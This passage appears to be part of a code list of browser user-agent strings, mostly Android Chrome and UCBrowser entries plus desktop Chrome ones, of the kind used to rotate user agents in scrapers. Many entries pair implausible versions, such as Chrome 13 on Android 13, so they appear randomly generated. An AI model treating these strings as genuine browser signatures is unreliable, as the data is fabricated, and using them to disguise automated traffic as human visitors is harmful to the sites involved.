'Mozilla/5.0 (Linux; Android 9; GT-P7320) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4187.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 21061119AL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2440.364 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GT-S7583T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4250.68 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; GT-S7562i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4256.75 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2407 Build/5) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.160.315 UCBrowser/10.10.0.558 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; M135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.5735.337 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH2459) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.6339.354 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4654.341 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2006C3LG Build/9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.1589.73 UCBrowser/11.7.0.4006 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2004J7AC Build/7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.6254.195 UCBrowser/20.7.0.4572 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; J727P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.4166.386 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; J105B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.6435.386 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-I9128E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4511.150 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4471.148 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4004.108 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2007J17G Build/K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.6206.44 UCBrowser/15.6.0.3798 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; X668) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/24.0.2692.38 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4163.117 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH1905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4295.140 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; M2007J3SY Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/18.0.2330.188 UCBrowser/20.9.0.2922 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.2487.344 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; M2006C3MT Build/T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.313.281 UCBrowser/20.2.0.2688 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH2209) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2429.152 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; M2105K81AC Build/3) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.1446.269 UCBrowser/6.3.0.3320 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4730.73 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4711.107 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; G316HU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3889.222 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH2037) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.3862.40 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4831.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 21061119AG Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.504.359 UCBrowser/18.8.0.4394 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4101.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4780.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4480.113 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; 22041219NY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.3911.282 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; GT-19300) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4264.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH2113 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.6150.303 UCBrowser/5.5.0.4590 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-B2710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4642.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; GT-S6310ZWAMID) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4088.64 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; GT-N8020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4579.148 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH1717) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.5338.37 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2101K9AG ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.6246.366 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2353) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.4293.191 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; CPH2477 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/16.0.3825.379 UCBrowser/9.8.0.456 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2666.240 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; 2203121C Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/21.0.1429.313 UCBrowser/10.4.0.2897 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH1701) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.1253.358 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; 21061119BI Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/10.0.1909.205 UCBrowser/8.3.0.4580 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.3947.60 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; GT-S6790N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4213.61 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH2457 Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.5742.253 UCBrowser/3.2.0.4230 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; 2201123G Build/F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/11.0.4126.389 UCBrowser/10.2.0.3967 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; M2006C3MNG Build/U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.4217.248 UCBrowser/20.2.0.1656 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2010J19SG Build/1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1974.109 UCBrowser/16.3.0.4878 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-8220S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4859.77 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2247) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3616.147 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; M2006C3LII Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/25.0.2700.107 UCBrowser/12.2.0.4849 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; S367VL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4076.190 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; 22041219G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/13.0.1233.392 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; X668) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5784.210 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4112.45 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; X530) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.1700.314 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; G150NL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.1519.75 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; M2102K1AC Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/23.0.4180.204 UCBrowser/11.4.0.1715 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.6301.49 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; A025A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.5713.368 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4179.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; T116NY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/25.0.1337.361 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4144.147 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; CPH2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.5140.225 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.6108.71 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36',
'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
'Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36',
'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-I5508) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4041.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; M2006C3MII Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.2060.227 UCBrowser/9.8.0.1296 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.519.396 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4152.47 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; G730V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.5424.265 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; 2109119BC Build/2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.4588.92 UCBrowser/14.8.0.2606 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH1951 Build/G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/16.0.2076.385 UCBrowser/5.10.0.1129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; G530FZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.5515.201 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; X680B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.4865.386 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; GT-S7560M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3980.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; X606) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.2273.279 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; 22011119TI Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.5905.245 UCBrowser/19.2.0.5188 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; G350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.1639.73 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36',
'Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36',
'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2401 Build/5) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.198.345 UCBrowser/17.6.0.2479 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.2380.305 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3900.53 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; X626) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3611.287 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH2001 Build/V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/22.0.6576.304 UCBrowser/14.4.0.4001 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4441.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; GT-S6792L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4788.41 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4432.57 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; GT-B2710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4752.72 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; 2109119DI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/23.0.353.263 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 22021211RC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2738.80 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 21091116UI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/13.0.6662.324 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH1837 Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/32.0.902.222 UCBrowser/19.6.0.3732 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 2106118C Build/T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.4847.168 UCBrowser/9.8.0.1367 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; 2109119BC Build/7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.6103.227 UCBrowser/9.4.0.1823 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; 2201123G Build/G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/19.0.5392.108 UCBrowser/12.10.0.2258 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 21051182G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.5762.211 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; X624B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2802.347 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; X657) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.4614.215 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; G530BT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.6497.238 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; 220233L2G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/13.0.1208.214 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4478.42 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; A520W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.1266.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-C3322) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4727.68 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2105K81AC Build/N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.572.314 UCBrowser/18.4.0.1825 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; S320VL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.3808.289 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 2203129G Build/D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.2781.363 UCBrowser/11.9.0.1557 Mobile Safari/537.36',
